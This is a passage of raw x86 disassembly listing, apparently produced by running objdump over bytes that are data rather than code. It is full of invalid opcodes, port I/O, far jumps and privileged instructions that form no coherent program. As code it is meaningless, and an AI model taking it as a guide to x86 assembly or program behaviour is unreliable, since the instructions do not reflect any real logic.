  407104:	mov    ?,WORD PTR [edx+edx*8-0x68]
  407108:	mov    ebx,0x81899ff8
  40710d:	es out 0x60,eax
  407110:	test   eax,0x5945df88
  407115:	int3   
  407116:	mov    edx,0xcc144f73
  40711b:	in     al,0xa5
  40711d:	fdiv   QWORD PTR [eax+0x5c89982]
  407123:	stos   DWORD PTR es:[edi],eax
  407124:	sub    dh,ah
  407126:	ret    0x1733
  407129:	rol    DWORD PTR [ebx],cl
  40712b:	mov    cl,BYTE PTR [edx+0x72c86c58]
  407131:	shl    BYTE PTR [ebx+0x36],1
  407134:	stos   DWORD PTR es:[edi],eax
  407135:	je     0x4071a9
  407137:	or     BYTE PTR ss:[ebx+0xe],0x34
  40713c:	hlt    
  40713d:	jae    0x40714d
  40713f:	rol    ah,cl
  407141:	arpl   si,ax
  407143:	sub    al,0xaf
  407145:	pop    ss
  407146:	enter  0x8b04,0x92
  40714a:	jb     0x407170
  40714c:	sbb    ebx,ecx
  40714e:	inc    ecx
  40714f:	jle    0x4070da
  407151:	out    dx,al
  407152:	pop    edi
  407153:	adc    eax,esi
  407155:	ret    
  407156:	jmp    0x2db89101
  40715b:	mov    eax,0x33433a76
  407160:	outs   dx,BYTE PTR ds:[esi]
  407161:	and    BYTE PTR [edx+0x4c],ch
  407164:	mov    eax,0xdbd8bd4a
  407169:	les    ebp,FWORD PTR [ebp+0x3c0c1816]
  40716f:	push   esp
  407170:	jae    0x40711d
  407172:	fstp   DWORD PTR [edi+0x6610627a]
  407178:	call   0x1769:0x1e54
  40717e:	shr    al,cl
  407180:	adc    eax,0x109add65
  407185:	test   ebx,ecx
  407187:	cmp    eax,0x6677c32b
  40718c:	sub    al,ah
  40718e:	sbb    DWORD PTR [ebx],esi
  407190:	adc    eax,0xf8bd43ac
  407195:	and    eax,0xfa93584d
  40719a:	or     al,0xf9
  40719c:	and    dl,BYTE PTR [di]
  40719f:	cmp    al,0xf0
  4071a1:	jae    0x407137
  4071a3:	mov    dh,0xb
  4071a5:	jecxz  0x4071e6
  4071a7:	call   0x5eb3:0x28cf3701
  4071ae:	sub    BYTE PTR [ebp+0x2f],0x7d
  4071b2:	jle    0x407181
  4071b4:	ret    
  4071b5:	sub    eax,DWORD PTR [ebx-0x2c91d392]
  4071bb:	cmc    
  4071bc:	mov    ?,WORD PTR [ebx+0x12]
  4071bf:	push   edi
  4071c0:	fyl2x  
  4071c2:	jp     0x407199
  4071c4:	or     al,0x64
  4071c6:	xor    esi,DWORD PTR [ebx-0x30]
  4071c9:	mov    eax,ds:0x41124e60
  4071ce:	fwait
  4071cf:	add    DWORD PTR [ecx-0x6b881fc],ecx
  4071d5:	jmp    0x28a9:0xd8fa92fa
  4071dc:	push   ebx
  4071dd:	mov    bl,0xf
  4071df:	sahf   
  4071e0:	sub    eax,0x3db5439e
  4071e5:	lods   al,BYTE PTR ds:[esi]
  4071e6:	sbb    al,0xf3
  4071e8:	push   ss
  4071e9:	jno    0x40717a
  4071eb:	mov    dl,0xf0
  4071ed:	lea    ebp,[ebp+eax*2+0x10c7c803]
  4071f4:	push   ss
  4071f5:	hlt    
  4071f6:	pop    ebp
  4071f7:	lock xchg edi,eax
  4071f9:	push   eax
  4071fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071fb:	mov    esi,esi
  4071fd:	arpl   bp,bp
  4071ff:	cmc    
  407200:	scas   eax,DWORD PTR es:[edi]
  407201:	ss imul ebp,ebp,0xbf1a19ab
  407208:	inc    DWORD PTR [eax-0x79d5c6c3]
  40720e:	hlt    
  40720f:	push   eax
  407210:	jae    0x407210
  407212:	out    0x96,al
  407214:	cwde   
  407215:	inc    eax
  407216:	inc    ebp
  407217:	sub    eax,DWORD PTR [eax+0x4b9aa2a5]
  40721d:	sti    
  40721e:	jno    0x40728c
  407220:	push   ds
  407221:	ds aas 
  407223:	pop    ss
  407224:	inc    edx
  407225:	add    bh,BYTE PTR [edx-0x26ff2657]
  40722b:	mov    WORD PTR [edx+0x648f4657],ss
  407231:	into   
  407232:	jecxz  0x4071d9
  407234:	fild   DWORD PTR [esi*4+0x1762f949]
  40723b:	clc    
  40723c:	test   eax,0x5fab5c49
  407241:	sub    al,0x53
  407243:	fcomp  QWORD PTR [edi+edx*2]
  407246:	jns    0x407287
  407248:	dec    edi
  407249:	daa    
  40724a:	fwait
  40724b:	repnz (bad) 
  40724d:	sahf   
  40724e:	retf   
  40724f:	xor    bl,dh
  407251:	icebp  
  407252:	cmp    al,0x30
  407254:	mov    al,ds:0xe3a1f5c7
  407259:	pop    ds
  40725a:	pop    ds
  40725b:	mov    dl,0x1f
  40725d:	cmp    al,BYTE PTR [ebx+0x17]
  407260:	fisttp DWORD PTR [ebx-0xacc58f1]
  407266:	int    0xa1
  407268:	and    DWORD PTR [edi-0x5c],esp
  40726b:	aad    0xad
  40726d:	in     eax,dx
  40726e:	mov    WORD PTR [esi],?
  407270:	int    0x10
  407272:	(bad)  
  407273:	pop    ss
  407274:	jbe    0x4072ac
  407276:	hlt    
  407277:	or     DWORD PTR [ecx+0x1e],ecx
  40727a:	jge    0x4072e6
  40727c:	ins    BYTE PTR es:[edi],dx
  40727d:	xchg   edi,eax
  40727e:	cs enter 0x749b,0x71
  407283:	adc    ecx,DWORD PTR [esi]
  407285:	pop    ds
  407286:	xor    al,0x67
  407288:	das    
  407289:	fs test eax,0x709df593
  40728f:	xchg   ebp,esp
  407291:	xor    ah,BYTE PTR [esi-0x25]
  407294:	mov    al,ds:0xa2f7cff9
  407299:	adc    ebp,DWORD PTR [edx+0x64]
  40729c:	sbb    DWORD PTR [ecx+eiz*8],esi
  40729f:	dec    ebx
  4072a0:	cmp    eax,0xfddd3112
  4072a5:	mov    ebx,DWORD PTR [ebx-0x606f9483]
  4072ab:	mov    esi,0x80268050
  4072b0:	ss push ecx
  4072b2:	pop    es
  4072b3:	out    0xe4,al
  4072b5:	mov    bl,0xa5
  4072b7:	mov    ch,0xf6
  4072b9:	out    0x89,eax
  4072bb:	ins    DWORD PTR es:[edi],dx
  4072bc:	push   cs
  4072bd:	dec    eax
  4072be:	ror    BYTE PTR [eax-0x1d46f2e8],cl
  4072c4:	lahf   
  4072c5:	sub    ecx,ebp
  4072c7:	test   eax,0xe903cb13
  4072cc:	cmp    bl,0x47
  4072cf:	inc    edi
  4072d0:	mul    ebx
  4072d2:	mov    bl,0xe7
  4072d4:	cdq    
  4072d5:	dec    ebp
  4072d6:	cmp    DWORD PTR [ecx+edi*4+0x9],eax
  4072da:	iret   
  4072db:	jb     0x407263
  4072dd:	inc    esi
  4072de:	xor    eax,0x738659e4
  4072e3:	mov    bh,0xd7
  4072e5:	push   ecx
  4072e6:	mov    eax,ds:0x48ecedee
  4072eb:	jmp    0x4072d4
  4072ed:	jns    0x407364
  4072ef:	fwait
  4072f0:	cmp    eax,0x46cbca2d
  4072f5:	sbb    bh,dl
  4072f7:	out    0x3f,eax
  4072f9:	pusha  
  4072fa:	xchg   DWORD PTR [ebp-0x61bbfc80],esp
  407300:	outs   dx,BYTE PTR ds:[esi]
  407301:	push   edi
  407302:	and    al,BYTE PTR [ecx-0x41]
  407305:	test   BYTE PTR [ecx+0x1522f978],cl
  40730b:	pop    ss
  40730c:	mov    bh,0xc9
  40730e:	adc    eax,0x51c7e055
  407313:	mov    ecx,0xac989865
  407318:	repz jmp FWORD PTR [ebp+0x43]
  40731c:	in     al,0x30
  40731e:	test   eax,0xf80bb2e5
  407323:	sub    BYTE PTR [ecx-0x1345810d],0x78
  40732a:	es pop esp
  40732c:	xor    eax,0xc4d6e51f
  407331:	imul   eax,DWORD PTR [si],0xffffff83
  407335:	imul   BYTE PTR [eax+0x4a21dbdb]
  40733b:	imul   bl
  40733d:	in     al,dx
  40733e:	inc    ecx
  40733f:	in     eax,dx
  407340:	call   0x10b8:0xddc11453
  407347:	sbb    esi,DWORD PTR [ebp-0x51b62913]
  40734d:	test   al,0xe6
  40734f:	push   eax
  407350:	cmp    dl,BYTE PTR [ebx-0x51]
  407353:	mov    dl,0xc5
  407355:	mov    eax,0xbf29cd38
  40735a:	mov    esi,0xcfeb3f18
  40735f:	jecxz  0x4073b9
  407361:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407362:	lods   al,BYTE PTR ds:[esi]
  407363:	test   ecx,ecx
  407365:	and    al,0xff
  407367:	out    0xfe,al
  407369:	into   
  40736a:	and    ch,BYTE PTR [ecx+0x5a]
  40736d:	adc    DWORD PTR [ebx-0x48706b04],0xffffffd4
  407374:	pop    edi
  407375:	xchg   bh,dl
  407377:	and    eax,0x60cbd223
  40737c:	jb     0x407329
  40737e:	cmp    eax,0x1d63589c
  407383:	(bad)  
  407384:	push   esi
  407385:	adc    al,0xad
  407387:	mov    dh,0x9a
  407389:	mov    ds:0xdd43ed27,al
  40738e:	(bad)  
  40738f:	stos   DWORD PTR es:[edi],eax
  407390:	add    BYTE PTR [ecx],ch
  407392:	aam    0xc9
  407394:	and    edx,DWORD PTR [ecx+0x65]
  407397:	or     eax,DWORD PTR [edx-0x3f412677]
  40739d:	lea    edi,[ebp+0x6]
  4073a0:	xchg   ebp,eax
  4073a1:	pushf  
  4073a2:	lock dec eax
  4073a4:	xchg   esp,eax
  4073a5:	(bad)  
  4073a6:	loop   0x407363
  4073a8:	out    0x86,eax
  4073aa:	inc    esi
  4073ab:	je     0x40740e
  4073ad:	mov    WORD PTR [eax],gs
  4073af:	xchg   ebx,eax
  4073b0:	icebp  
  4073b1:	xchg   edx,eax
  4073b2:	jmp    0x680e:0xa6dc80b5
  4073b9:	js     0x4073e8
  4073bb:	clc    
  4073bc:	js     0x4073e8
  4073be:	outs   dx,BYTE PTR ds:[esi]
  4073bf:	xchg   esi,eax
  4073c0:	ins    DWORD PTR es:[edi],dx
  4073c1:	pop    DWORD PTR [ecx]
  4073c3:	sub    edx,ebp
  4073c5:	jmp    0x6489bf43
  4073ca:	dec    BYTE PTR [edx+0x2a]
  4073cd:	jecxz  0x407357
  4073cf:	cmp    dl,BYTE PTR [ebx-0x49bbc35b]
  4073d5:	das    
  4073d6:	scas   al,BYTE PTR es:[edi]
  4073d7:	jbe    0x4073d5
  4073d9:	xchg   DWORD PTR [edi],ecx
  4073db:	mov    ch,0x59
  4073dd:	push   ecx
  4073de:	sub    BYTE PTR [edx-0x40682538],cl
  4073e4:	pop    eax
  4073e5:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4073e7:	jge    0x40743d
  4073e9:	sbb    BYTE PTR [ebp-0x3a052c64],al
  4073ef:	push   0x86ad281e
  4073f4:	inc    esi
  4073f5:	cmp    eax,0x4256d9f3
  4073fa:	or     al,bl
  4073fc:	jno    0x407405
  4073fe:	mov    bh,0xd4
  407400:	pop    esp
  407401:	add    BYTE PTR [ebx-0x6f91aa73],ch
  407407:	cmp    DWORD PTR [ecx+esi*2-0x3],ecx
  40740b:	push   edx
  40740c:	retf   0x4891
  40740f:	pop    esi
  407410:	std    
  407411:	xchg   edi,eax
  407412:	cs mov ch,0x15
  407415:	sub    al,0xa3
  407417:	(bad)  
  407418:	psrad  mm4,QWORD PTR [eax+0x34]
  40741c:	mov    edi,?
  40741e:	fwait
  40741f:	adc    eax,0x1c6a2c0a
  407424:	push   esi
  407425:	sbb    al,0xb
  407427:	lods   al,BYTE PTR ds:[esi]
  407428:	or     BYTE PTR [edx+esi*4+0x77dce60b],dl
  40742f:	sub    eax,0xf3c01de0
  407434:	ja     0x40749c
  407436:	and    eax,0xddbdb90e
  40743b:	(bad)
  40743e:	add    ch,ah
  407440:	out    0x24,al
  407442:	or     al,0x15
  407444:	pop    ds
  407445:	std    
  407446:	jecxz  0x40749b
  407448:	inc    ecx
  407449:	retf   0x2130
  40744c:	ss ja  0x40749b
  40744f:	xchg   DWORD PTR gs:[esi],ecx
  407452:	inc    esp
  407453:	xor    DWORD PTR [ebp-0x33],esi
  407456:	test   DWORD PTR [esi+0x1a8d9dab],ebx
  40745c:	cs out 0x43,al
  40745f:	sbb    DWORD PTR [ecx+0x5ea6dd9f],edi
  407465:	popf   
  407466:	sbb    eax,0x70b9d461
  40746b:	es ror bl,cl
  40746e:	xchg   DWORD PTR [edi-0x50d6cc4f],eax
  407474:	mov    ebx,DWORD PTR [ecx+0x79]
  407477:	int    0xa8
  407479:	xchg   edi,eax
  40747a:	push   es
  40747b:	aaa    
  40747c:	mov    BYTE PTR [edi],bh
  40747e:	aaa    
  40747f:	cmp    esp,DWORD PTR [edi-0x54bf291f]
  407485:	daa    
  407486:	stc    
  407487:	inc    eax
  407488:	xor    al,0xd2
  40748a:	jbe    0x40742c
  40748c:	xchg   esi,eax
  40748d:	repnz pop edi
  40748f:	and    DWORD PTR [edx+0x7d],ecx
  407492:	je     0x4074e1
  407494:	data16 mul BYTE PTR [eax]
  407497:	jns    0x4074b4
  407499:	mov    edi,0xcaf3fee5
  40749e:	aaa    
  40749f:	add    edi,edx
  4074a1:	stos   DWORD PTR es:[edi],eax
  4074a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074a3:	adc    eax,0x68982e9d
  4074a8:	or     BYTE PTR [edx+ebx*2],al
  4074ab:	dec    esi
  4074ac:	adc    BYTE PTR [esi-0x46],al
  4074af:	dec    ebp
  4074b0:	jmp    0xbca6:0xaa3bd73e
  4074b7:	dec    ecx
  4074b8:	xor    eax,0x9779a972
  4074bd:	fwait
  4074be:	in     eax,dx
  4074bf:	mov    al,0x83
  4074c1:	push   edi
  4074c2:	cmp    DWORD PTR [eax-0xfce750f],edi
  4074c8:	(bad)  
  4074c9:	stc    
  4074ca:	outs   dx,BYTE PTR ds:[esi]
  4074cb:	jl     0x40749c
  4074cd:	lahf   
  4074ce:	je     0x40748c
  4074d0:	arpl   WORD PTR [edi],si
  4074d2:	mov    ds:0xa57742ff,eax
  4074d7:	or     BYTE PTR [edi+0x63ae083f],0x8f
  4074de:	xor    eax,0x8558b8e2
  4074e3:	test   dl,bh
  4074e5:	xchg   esp,eax
  4074e6:	jb     0x4074c9
  4074e8:	enter  0x5c06,0x1
  4074ec:	outs   dx,DWORD PTR ds:[esi]
  4074ed:	push   0x9c26facb
  4074f2:	xchg   ch,ch
  4074f4:	scas   al,BYTE PTR es:[edi]
  4074f5:	cs and eax,0x17e9d4e0
  4074fb:	jb     0x407532
  4074fd:	ja     0x4074aa
  4074ff:	dec    BYTE PTR [eax+0x41]
  407502:	sbb    al,0xe4
  407504:	mov    ebp,DWORD PTR [eax-0x7387594b]
  40750a:	stc    
  40750b:	add    bh,BYTE PTR [edi]
  40750d:	dec    BYTE PTR [ecx]
  40750f:	imul   edx,ebx,0xa2778f3e
  407515:	pop    ss
  407516:	aam    0xfe
  407518:	mov    dh,0x97
  40751a:	sbb    al,0x3b
  40751c:	mov    dl,0xa7
  40751e:	pcmpeqb mm3,QWORD PTR [esp+edx*8+0x125f3256]
  407526:	jns    0x4074bf
  407528:	loope  0x407557
  40752a:	push   0x3f
  40752c:	or     esp,edx
  40752e:	push   eax
  40752f:	out    0xab,eax
  407531:	xor    al,0x9b
  407533:	out    0x74,al
  407535:	inc    edx
  407536:	loop   0x407552
  407538:	and    ah,BYTE PTR [esi+ebx*4-0x64801610]
  40753f:	or     BYTE PTR [ebp-0x65],0xf3
  407543:	cld    
  407544:	sub    al,0xd7
  407546:	je     0x407526
  407548:	xchg   edx,eax
  407549:	mov    ebx,0xce4b9f4a
  40754e:	sar    DWORD PTR [ebx-0x3b846f1e],cl
  407554:	mov    dh,0xc5
  407556:	fild   DWORD PTR [edi]
  407558:	mov    ebp,0xda1bcf
  40755d:	add    DWORD PTR [eax-0x8],0xffffffe3
  407561:	and    al,BYTE PTR [edx]
  407563:	mov    ecx,0xbaf10a78
  407568:	or     DWORD PTR [eax+0x67],eax
  40756b:	(bad)  
  40756c:	pop    esp
  40756d:	pop    eax
  40756e:	sub    BYTE PTR [ebx-0x5fa07a8b],0xbd
  407575:	fldl2e 
  407577:	push   0x5
  407579:	xor    al,0x4
  40757b:	call   0xd4b73a3e
  407580:	pop    edx
  407581:	inc    ecx
  407582:	xor    al,0xfc
  407584:	or     al,0x3b
  407586:	outs   dx,DWORD PTR ds:[esi]
  407587:	stc    
  407588:	inc    ebp
  407589:	aaa    
  40758a:	or     al,0xec
  40758c:	mov    ebx,0xe7d54c99
  407591:	cmp    DWORD PTR [ecx+eiz*4-0x32],0x13
  407596:	pop    ds
  407597:	fcmovnu st,st(7)
  407599:	xlat   BYTE PTR ds:[ebx]
  40759a:	mov    edx,0xd3b4682a
  40759f:	sub    dl,BYTE PTR [ebx-0x7b]
  4075a2:	jge    0x407581
  4075a4:	stos   BYTE PTR es:[edi],al
  4075a5:	fst    st(4)
  4075a7:	push   eax
  4075a8:	dec    esp
  4075a9:	ins    BYTE PTR es:[edi],dx
  4075aa:	add    ah,cl
  4075ac:	or     BYTE PTR [esi-0x55],dl
  4075af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075b0:	xor    al,0xf
  4075b2:	mov    cl,0xbb
  4075b5:	xchg   esp,eax
  4075b6:	adc    al,0x57
  4075b8:	test   al,0xf9
  4075ba:	xor    DWORD PTR [eax-0x7bb00238],eax
  4075c0:	dec    esi
  4075c1:	cmp    BYTE PTR [edi+ebp*2+0x2c],0x75
  4075c6:	adc    BYTE PTR [ecx],bl
  4075c8:	in     al,0xc
  4075ca:	inc    esi
  4075cb:	call   0xe82736c
  4075d0:	dec    esp
  4075d1:	cmp    ch,BYTE PTR [ecx+0x55d057d6]
  4075d7:	jns    0x40759b
  4075d9:	sbb    edx,eax
  4075db:	(bad)  
  4075dc:	mov    ah,BYTE PTR [edx+0x76]
  4075df:	sar    ecx,cl
  4075e1:	add    eax,0x3d83d970
  4075e6:	outs   dx,BYTE PTR ds:[esi]
  4075e7:	retf   
  4075e8:	neg    BYTE PTR [esi]
  4075ea:	and    BYTE PTR [ebx],bh
  4075ec:	jmp    0x4075ae
  4075ee:	test   DWORD PTR [esp+ecx*1+0x1642d2cf],ebp
  4075f5:	fsub   DWORD PTR [ecx]
  4075f7:	mov    edx,0xc283bca1
  4075fc:	pop    ds
  4075fd:	into   
  4075fe:	icebp  
  4075ff:	jl     0x4075fc
  407601:	jbe    0x4075e8
  407603:	iret   
  407604:	and    DWORD PTR ss:[ebx],esp
  407607:	psrlw  mm4,QWORD PTR [edx-0x29c46a93]
  40760e:	mov    al,ds:0x7186412b
  407613:	fwait
  407614:	jl     0x4075ee
  407616:	push   edi
  407617:	push   0x66d01e4
  40761c:	daa    
  40761d:	cld    
  40761e:	imul   edi,DWORD PTR [eax+edi*4],0x6ed857e9
  407625:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407626:	or     DWORD PTR [eax+0x30c50e50],esi
  40762c:	dec    esi
  40762d:	and    DWORD PTR [ecx-0x72d2d11f],0xffffffd5
  407634:	retf   
  407635:	sub    al,ch
  407637:	inc    eax
  407638:	stos   DWORD PTR es:[edi],eax
  407639:	leave  
  40763a:	push   ss
  40763b:	fldcw  WORD PTR [ecx]
  40763d:	jp     0x407691
  40763f:	mov    bh,0x39
  407641:	dec    edi
  407642:	aam    0x75
  407644:	test   eax,0x93d78cd
  407649:	cmp    BYTE PTR [ebx-0x49],al
  40764c:	popf   
  40764d:	xchg   esp,eax
  40764e:	mov    eax,ds:0xea19ec45
  407653:	jbe    0x407640
  407655:	mov    edx,0x65815c82
  40765a:	addr16 push cs
  40765c:	dec    edi
  40765d:	dec    ecx
  40765e:	leave  
  40765f:	fdivr  QWORD PTR [edx]
  407661:	mov    al,ds:0x5a2e61eb
  407666:	xchg   BYTE PTR [ecx+0x33cdb6e5],ah
  40766c:	mov    cl,0x33
  40766e:	mov    ds:0x502b459,al
  407673:	xor    DWORD PTR [eax],0x65602dc5
  407679:	pop    ss
  40767a:	xchg   esi,eax
  40767b:	jmp    0xae70:0xd3318792
  407682:	loopne 0x4076e0
  407684:	ins    BYTE PTR es:[edi],dx
  407685:	in     eax,dx
  407686:	shl    edx,cl
  407688:	test   eax,0x8f7ff1d5
  40768d:	adc    BYTE PTR [ebp-0x376ee4d8],bl
  407693:	out    0xc9,eax
  407695:	mov    bh,BYTE PTR [eax]
  407697:	loopne 0x4076fd
  407699:	add    ah,BYTE PTR [eax+0x5f]
  40769c:	jbe    0x4076fe
  40769e:	mov    bl,0xba
  4076a0:	xchg   edx,eax
  4076a1:	add    cl,BYTE PTR [edx+esi*4+0x2f]
  4076a5:	mov    eax,0x1c443d84
  4076aa:	int    0x85
  4076ac:	push   0x7394671a
  4076b1:	(bad)  
  4076b2:	lods   al,BYTE PTR ds:[esi]
  4076b3:	ss in  al,dx
  4076b5:	jl     0x4076f4
  4076b7:	adc    bh,bh
  4076b9:	ja     0x40771d
  4076bb:	cmc    
  4076bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076bd:	or     dl,BYTE PTR [esi]
  4076bf:	sbb    eax,0x451c69e7
  4076c4:	fisttp QWORD PTR [edi-0x3d87847c]
  4076ca:	sbb    ebp,DWORD PTR [ebp+0x14fed819]
  4076d0:	scas   eax,DWORD PTR es:[di]
  4076d2:	lock jg 0x4076a1
  4076d5:	nop
  4076d6:	into   
  4076d7:	std    
  4076d8:	(bad)  
  4076d9:	cmc    
  4076da:	iret   
  4076db:	inc    ebp
  4076dc:	add    al,0xd0
  4076de:	pop    ebx
  4076df:	add    ebp,ecx
  4076e1:	add    al,BYTE PTR [ebx+0xfdac444]
  4076e7:	shl    DWORD PTR [edi+edx*1-0x2fd11ac7],1
  4076ee:	les    esi,FWORD PTR [esi]
  4076f0:	adc    ch,BYTE PTR [edx-0x52]
  4076f3:	and    ecx,DWORD PTR [edi-0x43]
  4076f6:	jle    0x40770d
  4076f8:	mov    bh,0x71
  4076fa:	aam    0xb8
  4076fc:	mov    ?,WORD PTR [ebx+0x34]
  4076ff:	mov    ebx,ebp
  407701:	enter  0x60f4,0xfa
  407705:	mov    ecx,0x801ee612
  40770a:	mov    ds:0xa954595c,al
  40770f:	add    cl,BYTE PTR [edx+0x301f48bd]
  407715:	mov    fs,WORD PTR [ebp-0x47]
  407718:	loopne 0x4076b2
  40771a:	push   eax
  40771b:	pop    esp
  40771c:	push   ecx
  40771d:	test   eax,0x8b1ef8a1
  407722:	adc    BYTE PTR [edi+0x5739e755],bl
  407728:	pop    esp
  407729:	mov    ecx,0xb3ae34b8
  40772e:	mov    al,0x41
  407730:	cs jbe 0x40773f
  407733:	adc    cl,cl
  407735:	sub    DWORD PTR [edi],0x49e22a64
  40773b:	sub    edx,ecx
  40773d:	clc    
  40773e:	in     eax,dx
  40773f:	adc    eax,0xc1483295
  407744:	mov    bh,0xbe
  407746:	test   DWORD PTR [edx],ebp
  407748:	outs   dx,DWORD PTR ds:[esi]
  407749:	pop    ebx
  40774a:	lods   eax,DWORD PTR ds:[esi]
  40774b:	retf   0xbc69
  40774e:	add    al,0x77
  407750:	jo     0x407723
  407752:	lock aaa 
  407754:	fdivr  st,st(2)
  407756:	add    al,0x30
  407758:	push   ecx
  407759:	xchg   ecx,eax
  40775a:	or     edi,DWORD PTR [esi+0x23]
  40775d:	dec    esp
  40775e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40775f:	std    
  407760:	mov    cl,BYTE PTR [eax-0x6a]
  407763:	push   0x17c6c6a
  407768:	repz clc 
  40776a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40776b:	cmp    DWORD PTR [edx],eax
  40776d:	pop    ds
  40776e:	outs   dx,BYTE PTR ds:[esi]
  40776f:	mov    dh,0xe0
  407771:	jb     0x40778c
  407773:	jne    0x407747
  407775:	je     0x407758
  407777:	fld    DWORD PTR [edi+0x5b]
  40777a:	adc    cl,bl
  40777c:	cmp    eax,0x496092d6
  407781:	pop    ss
  407782:	fsub   st(6),st
  407784:	stos   DWORD PTR es:[edi],eax
  407785:	iret   
  407786:	jle    0x407722
  407788:	sub    eax,0x583b0f1d
  40778d:	and    eax,0xd9f7b97d
  407792:	add    eax,0x2cb4a4ec
  407797:	aad    0xce
  407799:	sub    eax,0xb38bfa6e
  40779e:	and    al,BYTE PTR [ecx-0x2943df44]
  4077a4:	pop    es
  4077a5:	out    dx,eax
  4077a6:	mov    esi,0xc780cf88
  4077ab:	lds    ebp,FWORD PTR [edi+0x24c9fff4]
  4077b1:	and    DWORD PTR [esi],ebx
  4077b3:	arpl   dx,si
  4077b5:	mov    eax,0x31acf342
  4077ba:	std    
  4077bb:	xchg   esp,eax
  4077bc:	dec    ebp
  4077bd:	push   ss
  4077be:	and    al,0x47
  4077c0:	sbb    edi,DWORD PTR [edx]
  4077c2:	jns    0x4077ef
  4077c4:	push   esp
  4077c5:	test   eax,0x36c28f60
  4077ca:	lock or eax,0x23b1e488
  4077d0:	add    ch,BYTE PTR [ebp+0x20]
  4077d3:	leave  
  4077d4:	mov    ecx,edx
  4077d6:	and    eax,esi
  4077d8:	fisubr WORD PTR [ebx-0x1b]
  4077db:	(bad)  
  4077df:	inc    eax
  4077e0:	jmp    0x5f45b25f
  4077e5:	or     ebx,DWORD PTR [eax-0xcee6500]
  4077eb:	cmp    al,0x73
  4077ed:	out    0xa5,al
  4077ef:	or     al,0xd7
  4077f1:	pusha  
  4077f2:	test   al,0x36
  4077f4:	lahf   
  4077f5:	iret   
  4077f6:	and    BYTE PTR [edi],bl
  4077f8:	push   DWORD PTR [edi-0x6c]
  4077fb:	adc    DWORD PTR [edx-0x7],esp
  4077fe:	in     eax,dx
  4077ff:	stos   DWORD PTR es:[edi],eax
  407800:	rol    ecx,1
  407802:	mov    ebx,0x38140ea7
  407807:	icebp  
  407808:	fwait
  407809:	pop    esp
  40780a:	and    DWORD PTR [ebx+0x9],eax
  40780d:	push   0x1c1ee63
  407812:	jge    0x4077d3
  407814:	jmp    0x407889
  407816:	xchg   DWORD PTR [ecx],edx
  407818:	and    edi,DWORD PTR [ecx+0x30]
  40781b:	lods   al,BYTE PTR ds:[esi]
  40781c:	fmul   DWORD PTR [ecx+0x49ff0632]
  407822:	and    bh,ah
  407824:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407825:	mov    eax,ebp
  407827:	lock outs dx,DWORD PTR ds:[esi]
  407829:	dec    edx
  40782a:	scas   al,BYTE PTR es:[edi]
  40782b:	pop    esi
  40782c:	fnstsw WORD PTR [eax-0x36691204]
  407832:	cmp    al,0x2b
  407834:	and    BYTE PTR [esi+0x35],dh
  407837:	ret    0x167b
  40783a:	mov    ebx,0x1e3f85cd
  40783f:	cmp    DWORD PTR [esp+eax*2+0x129c4bbb],ebp
  407846:	stc    
  407847:	aam    0xa0
  407849:	add    DWORD PTR [eax+0x39d4d146],esp
  40784f:	ret    0xc3b7
  407852:	mov    eax,0xd7a49604
  407857:	(bad)  
  407858:	(bad)
  40785b:	jmp    0x7aa52423
  407860:	mov    esi,0x118d12e5
  407865:	repz lahf 
  407867:	mov    ds:0x451b258f,eax
  40786c:	inc    esp
  40786d:	inc    edx
  40786e:	mov    al,0x6b
  407870:	pop    esi
  407871:	pop    ds
  407872:	sub    DWORD PTR [ebx+0x14],esp
  407875:	inc    ecx
  407876:	popf   
  407877:	mov    esi,0x22cc24b3
  40787c:	adc    dl,dl
  40787e:	dec    edx
  40787f:	into   
  407880:	push   ds
  407881:	in     eax,dx
  407882:	inc    esi
  407883:	bound  ebx,QWORD PTR [ebx]
  407885:	sti    
  407886:	dec    ebp
  407887:	outs   dx,DWORD PTR ds:[esi]
  407888:	inc    ebx
  407889:	out    dx,al
  40788a:	cli    
  40788b:	(bad)  
  40788c:	mov    DWORD PTR [esi],eax
  40788e:	pop    ds
  40788f:	shl    edi,cl
  407891:	arpl   WORD PTR [eax+0x382b44dd],bp
  407897:	push   edx
  407898:	in     al,dx
  407899:	pop    esp
  40789a:	or     al,0x44
  40789c:	push   edx
  40789d:	repnz xor dl,BYTE PTR es:[edi-0x6a]
  4078a2:	mov    ds:0x97e3580e,al
  4078a7:	xor    eax,0x462b5304
  4078ac:	call   0xeb06:0x8b22ef0b
  4078b3:	sahf   
  4078b4:	leave  
  4078b5:	xchg   ebp,eax
  4078b6:	dec    eax
  4078b7:	pop    edx
  4078b8:	inc    ecx
  4078b9:	xchg   esp,eax
  4078ba:	(bad)  
  4078bb:	iret   
  4078bc:	cmc    
  4078bd:	shr    BYTE PTR [esi+0x6bff8604],cl
  4078c3:	lods   eax,DWORD PTR ds:[esi]
  4078c4:	fist   DWORD PTR [esi-0x42]
  4078c7:	(bad)  
  4078c9:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4078cb:	ins    BYTE PTR es:[edi],dx
  4078cc:	xor    ebp,ecx
  4078ce:	ds mov esp,ebx
  4078d1:	and    BYTE PTR [ebx+0x706aebb],bl
  4078d7:	sbb    edx,DWORD PTR [edi+0x78ede2a]
  4078dd:	adc    eax,0xb9b1345e
  4078e2:	lods   al,BYTE PTR ds:[esi]
  4078e3:	pop    ss
  4078e4:	add    al,0xa8
  4078e6:	and    ah,BYTE PTR [edi+ebp*4+0x16fcb14d]
  4078ed:	jmp    0xab754b33
  4078f2:	sub    ecx,esi
  4078f4:	and    eax,0x215d5a02
  4078f9:	mov    bh,0x84
  4078fb:	ins    BYTE PTR es:[edi],dx
  4078fc:	add    eax,0xb24277a3
  407901:	add    bh,BYTE PTR [ecx]
  407903:	outs   dx,BYTE PTR ds:[esi]
  407904:	out    dx,eax
  407905:	sub    al,0x6a
  407907:	inc    eax
  407908:	dec    esi
  407909:	xchg   edi,eax
  40790a:	mov    ds,WORD PTR [edx+ecx*4+0x5f5331b7]
  407911:	scas   eax,DWORD PTR es:[edi]
  407912:	ret    
  407913:	pushf  
